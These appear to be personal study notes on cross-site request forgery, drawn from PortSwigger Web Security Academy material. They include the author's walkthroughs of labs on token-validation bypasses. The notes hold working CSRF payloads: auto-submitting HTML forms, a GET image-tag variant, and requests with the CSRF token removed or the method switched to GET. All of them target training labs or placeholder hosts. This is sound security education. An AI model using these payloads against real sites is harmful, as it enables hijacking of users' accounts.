## What is CSRF?
- Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.
-  ![[csrf1-p.png]]
## What is the impact of a CSRF attack?
- In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.
## How does CSRF work?

For a CSRF attack to be possible, three key conditions must be in place:

- **A relevant action.** There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).
- **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.
- **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.
## How does CSRF work? - Continued

For example, suppose an application contains a function that lets the user change the email address on their account. When a user performs this action, they make an HTTP request like the following:
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 30 
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE 

email=wiener@normal-user.com
```
This meets the conditions required for CSRF:

- The action of changing the email address on a user's account is of interest to an attacker. Following this action, the attacker will typically be able to trigger a password reset and take full control of the user's account.
- The application uses a session cookie to identify which user issued the request. There are no other tokens or mechanisms in place to track user sessions.
- The attacker can easily determine the values of the request parameters that are needed to perform the action.
With these conditions in place, the attacker can construct a web page containing the following HTML:
```html
<html> 
<body> 
<form action="https://vulnerable-website.com/email/change" method="POST"> 
<input type="hidden" name="email" value="pwned@evil-user.net" /> 
</form> 
<script> 
	document.forms[0].submit(); 
</script> 
</body> 
</html>
```

 If a victim user visits the attacker's web page, the following will happen:

- The attacker's page will trigger an HTTP request to the vulnerable website.
- If the user is logged in to the vulnerable website, their<span style="color:rgb(192, 0, 0)"> browser will automatically  include their session cookie in the request</span> (assuming SameSite cookies are not being used).
- The vulnerable website will process the request in the normal way, treat it as having been made by the victim user, and change their email address.
#### Note
- Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.


## How to construct a CSRF attack

Manually creating the HTML needed for a CSRF exploit can be cumbersome, particularly where the desired request contains a large number of parameters, or there are other quirks in the request. The easiest way to construct a CSRF exploit is using the CSRF PoC generator that is built in to Burp Suite Professional:

- Select a request anywhere in Burp Suite Professional that you want to test or exploit.
- From the right-click context menu, select Engagement tools / Generate CSRF PoC.
- Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser).
- You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of requests.
- Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable website, and test whether the intended request is issued successfully and the desired action occurs.

# [Practice](https://portswigger.net/web-security/learning-paths/csrf/csrf-how-to-construct-a-csrf-attack/csrf/lab-no-defenses#) in laboratory
## Try to solve it yourself.
## Solution
- login and change email
- find the resulting request in your Proxy history.
- generate **html code** for exploit this point
	- you can use burp sutie pro --> generate csrf poc 
	- or write manually
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a40007d041d1de88085b7ee004500ab.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="salar&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
- .
	- check code working
	- send victim
## How to deliver a CSRF exploit

The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS. Typically, the attacker will place the malicious HTML onto a website that they control, and then induce victims to visit that website. This might be done by feeding the user a link to the website, via an email or social media message. Or if the attack is placed into a popular website (for example, in a user comment), they might just wait for users to visit the website.

Note that some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL on the vulnerable website. In this situation, the attacker may not need to employ an external site, and can directly feed victims a malicious URL on the vulnerable domain. In the preceding example, if the request to change email address can be performed with the GET method, then a self-contained attack would look like this:
```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```
## Common defences against CSRF

Nowadays, successfully finding and exploiting CSRF vulnerabilities often involves bypassing anti-CSRF measures deployed by the target website, the victim's browser, or both. The most common defenses you'll encounter are as follows:

- **CSRF tokens** - A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim.
    
- **SameSite cookies** - SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. As requests to perform sensitive actions typically require an authenticated session cookie, the appropriate SameSite restrictions may prevent an attacker from triggering these actions cross-site. Since 2021, Chrome enforces `Lax` SameSite restrictions by default. As this is the proposed standard, we expect other major browsers to adopt this behavior in future.
    
- **Referer-based validation** - Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, **normally by verifying that the request originated from the application's own domain**. This is generally less effective than CSRF token validation


## What is a CSRF token?

A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When issuing a request to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token. Otherwise, the server will refuse to perform the requested action.

A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form, for example:
```html
<form name="change-email-form" action="/my-account/change-email" method="POST"> <label>Email</label> 
<input required type="email" name="email" value="example@normal-website.com"> 

<input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
<button class='button' type='submit'> Update email </button> 
</form>
```
Submitting this form results in the following request:
```HTTP
POST /my-account/change-email HTTP/1.1 
Host: normal-website.com 
Content-Length: 70 
Content-Type: application/x-www-form-urlencoded 

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

When implemented correctly, CSRF tokens help protect against CSRF attacks by making it difficult for an attacker to construct a valid request on behalf of the victim. As the attacker has no way of predicting the correct value for the CSRF token, they won't be able to include it in the malicious request.
#### Note

CSRF tokens don't have to be sent as hidden parameters in a `POST` request. Some applications place CSRF tokens in HTTP headers, for example. The way in which tokens are transmitted has a significant impact on the security of a mechanism as a whole. For more information, see How to prevent CSRF vulnerabilities.


## Common flaws in CSRF token validation

CSRF vulnerabilities typically arise due to flawed validation of CSRF tokens. In this section, we'll cover some of the most common issues that enable attackers to bypass these defenses.
## Validation of CSRF token depends on request method

Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.

In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:
```HTTP
GET /email/change?email=pwned@evil-user.net HTTP/1.1 
Host: vulnerable-website.com 
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```
# Try to solve it yourself.
# [practice](https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method#) in this laboratory
- #### [read](https://medium.com/@frank.leitner/writeup-csrf-where-token-validation-depends-on-request-method-portswigger-academy-fefe1c3da035) this write-up for this lab
- ##### What I write below is my own opinion.
this we packet
```HTTP
POST /my-account/change-email HTTP/1.1
Host: 0a5400b90322b11580a6f85c006500c8.web-security-academy.net
Cookie: session=YXF04bMtywY63gjvzKpfl5jkWldD5d42
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://0a5400b90322b11580a6f85c006500c8.web-security-academy.net
Sec-Gpc: 1
Referer: https://0a5400b90322b11580a6f85c006500c8.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

email=dsv%40gamil.com&csrf=T4aMT2x6UTbkCSPNfDc6tuTPpcRA27kL
```
- when we try send this packet(request)  without`&crf=T4aMT2x6UTbkCSPNfDc6tuTPpcRA27kL`
- server return 
```HTTP
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 26

"Missing parameter 'csrf'"
```
- but we try to send request by `GET` and without `&csrf=T4aMT2x6UTbkCSPNfDc6tuTPpcRA27kL`  What is happening?
- like this
```HTTP
GET /my-account/change-email?email=dsv%40gamil.com HTTP/2
Host: 0a5400b90322b11580a6f85c006500c8.web-security-academy.net
Cookie: session=YXF04bMtywY63gjvzKpfl5jkWldD5d42
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://0a5400b90322b11580a6f85c006500c8.web-security-academy.net
Sec-Gpc: 1
Referer: https://0a5400b90322b11580a6f85c006500c8.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```
- server not checking CSRF token
- and change email
- OK,  generate html code for exploit --> CSRF PoC --> in burp suite
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5400b90322b11580a6f85c006500c8.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="dsv&#64;gamil&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

# Validation of CSRF token depends on token being present
Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:

```http
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 25 
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm 

email=pwned@evil-user.net
```

# Try to solve it yourself.
## [practice](https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present) in this laboratory
- change your email 
- see the sending packet
```http
POST /my-account/change-email HTTP/2
Host: 0abb002c04cda0528141b7f900b900ce.web-security-academy.net
Cookie: session=G4G5PrrI5VPcfVdFrGKyvGTJlU11GCSQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Origin: https://0abb002c04cda0528141b7f900b900ce.web-security-academy.net
Sec-Gpc: 1
Referer: https://0abb002c04cda0528141b7f900b900ce.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=salarr%40gmail.com&csrf=RLW2wBxsSae1E266kY7eSe2ZuO6DOHA5
```
- remove `&csrf=RLW2wBxsSae1E266kY7eSe2ZuO6DOHA5`  and send again
- if response == `302` status code 
	- is working
- generate html code for exploiting  --> by burp suite pro or manually
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0abb002c04cda0528141b7f900b900ce.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="salarr&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```



# CSRF token is not tied to the user session

Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.
# That's all, I'll read the rest later.
